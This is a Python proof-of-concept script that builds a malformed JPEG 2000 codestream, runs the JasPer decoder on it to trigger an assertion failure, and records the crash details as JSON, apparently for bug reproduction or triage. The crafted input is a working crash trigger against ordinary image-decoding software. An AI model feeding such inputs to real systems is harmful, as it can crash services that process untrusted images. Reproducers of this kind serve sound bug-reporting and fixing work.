#!/usr/bin/env python3
"""Trigger and report a JasPer JPC decoder assertion failure."""

import argparse
import json
import signal
import subprocess
import sys
import tempfile
import time
from pathlib import Path


MAX_CAPTURE = 8192


def marker(marker_code: int, payload: bytes) -> bytes:
    marker_bytes = marker_code.to_bytes(2, "big")
    length_bytes = (len(payload) + 2).to_bytes(2, "big")
    return marker_bytes + length_bytes + payload


def build_payload() -> bytes:
    siz = (
        (0).to_bytes(2, "big")
        + (1).to_bytes(4, "big")
        + (1).to_bytes(4, "big")
        + (0).to_bytes(4, "big")
        + (0).to_bytes(4, "big")
        + (1).to_bytes(4, "big")
        + (1).to_bytes(4, "big")
        + (0).to_bytes(4, "big")
        + (0).to_bytes(4, "big")
        + (1).to_bytes(2, "big")
        + bytes((7, 1, 1))
    )

    cod = (
        b"\x00\x00"
        + (1).to_bytes(2, "big")
        + b"\x00"
        + bytes((5, 4, 4, 0, 2))
    )
    quantization = bytes.fromhex("4040484850484850484850484850484850")
    tile_part_length = 18
    sot = (
        (0).to_bytes(2, "big")
        + tile_part_length.to_bytes(4, "big")
        + bytes((0, 1))
    )

    payload = b"\xff\x4f"
    payload += marker(0xFF51, siz)
    payload += marker(0xFF52, cod)
    payload += marker(0xFF5C, quantization)
    payload += marker(0xFF90, sot)
    payload += b"\xff\x93" + b"\x80" * 6 + b"\xff\xd9"
    return payload


def decode_output(data: bytes) -> str:
    return data.decode("utf-8", errors="replace")


def truncate_text(text: str, limit: int = MAX_CAPTURE) -> str:
    if len(text) <= limit:
        return text
    return text[:limit] + f"\n[truncated; {len(text) - limit} characters omitted]"


def signal_name(returncode: int | None) -> str | None:
    if returncode is None or returncode >= 0:
        return None
    try:
        return signal.Signals(-returncode).name
    except ValueError:
        return None


def extract_evidence(stderr: str, returncode: int | None, timed_out: bool) -> str:
    if timed_out:
        return "process timed out"
    if returncode is not None and returncode != 0 and not stderr:
        return f"process exited with return code {returncode}"

    keywords = (
        "Assertion",
        "assertion",
        "Sanitizer",
        "sanitizer",
        "AddressSanitizer",
        "UndefinedBehaviorSanitizer",
        "runtime error:",
        "SEGV",
        "segmentation fault",
        "fatal",
        "error:",
    )
    lines = [line.strip() for line in stderr.splitlines() if line.strip()]
    matches = [line for line in lines if any(keyword in line for keyword in keywords)]
    if matches:
        return "\n".join(matches[:4])[:MAX_CAPTURE]
    return "\n".join(lines[-4:])[:MAX_CAPTURE]


def result_object(
    binary: str,
    command: list[str],
    returncode: int | None,
    timed_out: bool,
    runtime_ms: int,
    stdout: str,
    stderr: str,
    error: str | None,
) -> dict[str, object]:
    return {
        "binary": binary,
        "command": command,
        "returncode": returncode,
        "signal": signal_name(returncode),
        "timed_out": timed_out,
        "runtime_ms": runtime_ms,
        "stdout": truncate_text(stdout),
        "stderr": truncate_text(stderr),
        "observable": {
            "kind": "stderr",
            "value": extract_evidence(stderr, returncode, timed_out),
            "path": None,
        },
        "error": error,
    }


def run(binary: str, timeout: float) -> dict[str, object]:
    payload = build_payload()
    with tempfile.TemporaryDirectory(prefix="jasper-jpc-poc-") as directory_name:
        input_path = Path(directory_name) / "trigger.jpc"
        input_path.write_bytes(payload)
        command = [
            binary,
            "-f",
            str(input_path),
            "-t",
            "jpc",
            "-F",
            "/dev/null",
            "-T",
            "pnm",
        ]

        start = time.monotonic()
        try:
            process = subprocess.Popen(
                command,
                stdin=subprocess.DEVNULL,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
            )
            try:
                stdout_bytes, stderr_bytes = process.communicate(timeout=timeout)
                timed_out = False
                error = None
            except subprocess.TimeoutExpired:
                timed_out = True
                process.kill()
                stdout_bytes, stderr_bytes = process.communicate()
                error = f"process timed out after {timeout:g} seconds"

            runtime_ms = round((time.monotonic() - start) * 1000)
            return result_object(
                binary,
                command,
                process.returncode,
                timed_out,
                runtime_ms,
                decode_output(stdout_bytes or b""),
                decode_output(stderr_bytes or b""),
                error,
            )
        except FileNotFoundError:
            runtime_ms = round((time.monotonic() - start) * 1000)
            return result_object(
                binary,
                command,
                None,
                False,
                runtime_ms,
                "",
                "",
                f"binary not found: {binary}",
            )
        except OSError as exception:
            runtime_ms = round((time.monotonic() - start) * 1000)
            return result_object(
                binary,
                command,
                None,
                False,
                runtime_ms,
                "",
                "",
                f"failed to execute binary: {exception}",
            )


def parse_args() -> argparse.Namespace:
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--binary", required=True, help="path to the jasper binary")
    parser.add_argument("--json-out", help="path for the JSON result")
    parser.add_argument(
        "--timeout",
        type=float,
        default=300.0,
        help="target timeout in seconds (default: 300)",
    )
    return parser.parse_args()


def main() -> int:
    args = parse_args()
    if args.timeout <= 0:
        print("error: --timeout must be greater than zero", file=sys.stderr)
        return 2

    result = run(args.binary, args.timeout)
    rendered = json.dumps(result, indent=2, ensure_ascii=False)
    if args.json_out:
        output_path = Path(args.json_out)
        output_path.parent.mkdir(parents=True, exist_ok=True)
        output_path.write_text(rendered + "\n", encoding="utf-8")
    else:
        print(rendered)
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
